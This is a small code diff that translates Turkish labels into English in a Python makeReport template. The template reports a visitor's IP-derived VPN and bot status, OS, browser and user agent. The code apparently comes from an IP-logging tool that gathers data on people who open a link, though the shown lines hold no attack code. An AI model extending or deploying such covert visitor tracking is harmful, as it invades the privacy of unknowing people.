@@ -144,11 +144,11 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 > **VPN:** `{info['proxy']}`
 > **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`
 
-**Bilgisayar Bilgileri:**
-> **İşletim Sistemi:** `{os}`
-> **Tarayıcı:** `{browser}`
+**System Info:**
+> **OS:** `{os}`
+> **Browser:** `{browser}`
 
-**Aracı:**
+**User:**
 ```
 {useragent}
 ```""",
